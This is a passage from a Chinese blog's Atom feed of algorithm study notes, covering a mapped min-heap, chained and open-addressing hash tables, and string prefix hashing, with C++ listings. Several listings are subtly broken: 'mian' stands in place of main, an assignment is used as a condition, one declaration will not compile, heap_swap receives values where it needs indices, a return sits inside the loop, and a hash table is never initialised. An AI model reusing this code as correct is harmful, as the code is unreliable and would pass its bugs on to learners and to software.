class="comment">//要修改的两个堆数组下标a、b，可得=&gt; hp[a],hp[b] ,对应的插入数下标 =&gt; ph[hp[a]], ph[hp[b]] ,插入数对应的堆数组下标</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">heap_swap</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">swap</span>(ph[hp[a]], ph[hp[b]]); <span class="comment">// 堆数组下标要跟着插入数下标改变</span></span><br><span class="line">    <span class="built_in">swap</span>(hp[a], hp[b]);  <span class="comment">// 插入数下标要跟着堆数组下标对应的值改变</span></span><br><span class="line">    <span class="built_in">swap</span>(h[a], h[b]);   <span class="comment">// 交换堆数组下标对应的值</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">down</span><span class="params">(<span class="keyword">int</span> u)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t = u;      <span class="comment">//t表示三个点里的最小值的节点下标</span></span><br><span class="line">    <span class="comment">//判断有无左右节点</span></span><br><span class="line">    <span class="keyword">if</span> (u * <span class="number">2</span> &lt;= cnt &amp;&amp; h[u * <span class="number">2</span>] &lt; h[t]) t = u * <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> (u * <span class="number">2</span> + <span class="number">1</span> &lt;= cnt &amp;&amp; h[u * <span class="number">2</span> + <span class="number">1</span>] &lt; h[t]) t = u * <span class="number">2</span> + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (u != t) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">heap_swap</span>(h[t], h[u]);</span><br><span class="line">        <span class="built_in">down</span>(t);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">up</span><span class="params">(<span class="keyword">int</span> u)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//判断上面是否有节点</span></span><br><span class="line">    <span class="keyword">while</span> (u / <span class="number">2</span> &amp;&amp; h[u / <span class="number">2</span>] &gt; h[u]) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">heap_swap</span>(h[u / <span class="number">2</span>], h[u]);</span><br><span class="line">        u /= <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//建堆(最后一行有n/2个节点，所以我们只需要把上面给建好)</span></span><br><span class="line">    <span class="comment">//for (int i = n / 2; i; i --) down(i);</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (n --)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">char</span> op[<span class="number">5</span>];</span><br><span class="line">        <span class="keyword">int</span> k, x;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, op);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(op, <span class="string">&quot;I&quot;</span>))   <span class="comment">//插入元素</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;x);</span><br><span class="line">            cnt ++ ;</span><br><span class="line">            m ++ ;</span><br><span class="line">            ph[m] = cnt, hp[cnt] = m;   <span class="comment">//插入的数先放最后</span></span><br><span class="line">            h[cnt] = x;</span><br><span class="line">            <span class="built_in">up</span>(cnt);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(op, <span class="string">&quot;PM&quot;</span>)) <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, h[<span class="number">1</span>]);   <span class="comment">//输出最小</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(op, <span class="string">&quot;DM&quot;</span>))     <span class="comment">//删除最小</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">heap_swap</span>(<span class="number">1</span>, cnt);</span><br><span class="line">            cnt -- ;</span><br><span class="line">            <span class="built_in">down</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(op, <span class="string">&quot;D&quot;</span>))      <span class="comment">//删除第k个插入的数</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;k);</span><br><span class="line">            k = ph[k];          <span class="comment">//找到它在堆里的位置</span></span><br><span class="line">            <span class="built_in">heap_swap</span>(k, cnt);</span><br><span class="line">            cnt -- ;</span><br><span class="line">            <span class="built_in">up</span>(k);</span><br><span class="line">            <span class="built_in">down</span>(k);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;k, &amp;x);</span><br><span class="line">            k = ph[k];</span><br><span class="line">            h[k] = x;</span><br><span class="line">            <span class="built_in">up</span>(k);</span><br><span class="line">            <span class="built_in">down</span>(k);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h3 id="7-哈希表"><a href="#7-哈希表" class="headerlink" title="7.哈希表"></a>7.哈希表</h3><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220118152232777.png" alt="image-20220118152232777"></p><p>作用：把一个大的空间或值域映射到一个 比较小的空间（一般从0到N）</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220118160343665.png" alt="image-20220118160343665"></p><p>因为数的范围过于庞大，不免会发生不同数字映射到相同数字的情况，为了处理这种冲突，我们将使用上图的拉链法或开放寻址法</p><p><strong>拉链法</strong>：开一个一维数组，存储对应的哈希值，当出现冲突时，在对应的位置上拉出链条存放</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220118153722819.png" alt="image-20220118153722819"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">100003</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> h[N], e[N], ne[N], idx;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">insert</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> k = (x % N + N) % N; <span class="comment">//让余数为正数</span></span><br><span class="line"></span><br><span class="line">    e[idx] = x, ne[idx] = h[k], h[k] = idx ++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">find</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> k = (x % N + N) % N;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = h[k]; i != <span class="number">-1</span>; i = ne[i])  <span class="comment">//在对应的位置遍历查找有没有相等的值</span></span><br><span class="line">        <span class="keyword">if</span> (e[i] == x)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mian</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (n --)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">char</span> op[<span class="number">2</span>];</span><br><span class="line">        <span class="keyword">int</span> x;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s%d&quot;</span>, op, &amp;x);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (*op = <span class="string">&#x27;I&#x27;</span>) <span class="built_in">insert</span>(x);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">find</span>(x)) <span class="built_in">puts</span>(<span class="string">&quot;yes&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="built_in">puts</span>(<span class="string">&quot;No&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>开放寻址法</strong>：只开一个一维数组，但是长度要比较长，放元素时，如果该位置有元素，就向后找空位</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220118162755521.png" alt="image-20220118162755521"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">200003</span>, null = <span class="number">0x3f3f3f3f3f3f</span>;<span class="comment">//开的要多！！！</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> h[N],;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find</span><span class="params">(<span class="keyword">int</span> x)</span> <span class="comment">//如果数字在哈希表中存在,返回位置；不存在，返回这个数应该存储的位置</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> k = (x % N + N) % N;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (h[k] != null &amp;&amp; h[k] != x)</span><br><span class="line">    &#123;</span><br><span class="line">        k ++;</span><br><span class="line">        <span class="keyword">if</span> (k == N) k = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> k;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mian</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(h, <span class="number">0x3f</span>, <span class="keyword">sizeof</span> h);  <span class="comment">//初始化</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (n --)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">char</span> op[<span class="number">2</span>];</span><br><span class="line">        <span class="keyword">int</span> x;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s%d&quot;</span>, op, &amp;x);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> k = <span class="built_in">find</span>(x);</span><br><span class="line">        <span class="keyword">if</span> (*op == <span class="string">&#x27;I&#x27;</span>) h[k] = x;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (h[k] != null) <span class="built_in">puts</span>(<span class="string">&quot;Yes&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="built_in">puts</span>(<span class="string">&quot;No&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>字符串前缀哈希法</strong>：h[1] —— 第一个字符的哈希，h[2] —— 第二个的哈希……</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220118171737316.png" alt="image-20220118171737316"></p><p>我们把字符串看成P进制的数，ABC就是123的p进制数</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220118175003857.png" alt="image-20220118175003857"></p><ul><li><p>一般情况下，不能映射成0</p></li><li><p>哈希方法：人品够好，不用考虑冲突</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220118175423704.png" alt="image-20220118175423704"></p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220118185254137.png" alt="image-20220118185254137">数轴上的低位对应着字符串的高位</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> Ull;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">100010</span>, P = <span class="number">131</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> n, m;</span><br><span class="line"><span class="keyword">char</span> str[N];</span><br><span class="line"><span class="keyword">int</span> h[N], p[N];     <span class="comment">//p[]用来存储各位数都是p的多少次方</span></span><br><span class="line"></span><br><span class="line"><span class="function">Ull <span class="title">get</span><span class="params">(<span class="keyword">int</span> l, <span class="keyword">int</span> r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> h[r] - h[l] * p[r - l + <span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%s&quot;</span>, &amp;n, &amp;m, str + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    p[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i ++)</span><br><span class="line">    &#123;</span><br><span class="line">        p[i] = p[i - <span class="number">1</span>] * P;</span><br><span class="line">        h[i] = h[i - <span class="number">1</span>] * P + str[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (m --)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> l1, r1, l2, r2;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d%d&quot;</span>, &amp;l1, &amp;r1, &amp;l2, &amp;r2);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">get</span>(l1, r1) == <span class="built_in">get</span>(l2, r2)) <span class="built_in">puts</span>(<span class="string">&quot;Yes&quot;</span>);</span><br><span class="line">        <span class="keyword">else</span> <span class="built_in">puts</span>(<span class="string">&quot;No&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="算法基础" scheme="https://0410wzn.top/tags/%E7%AE%97%E6%B3%95%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
</feed>
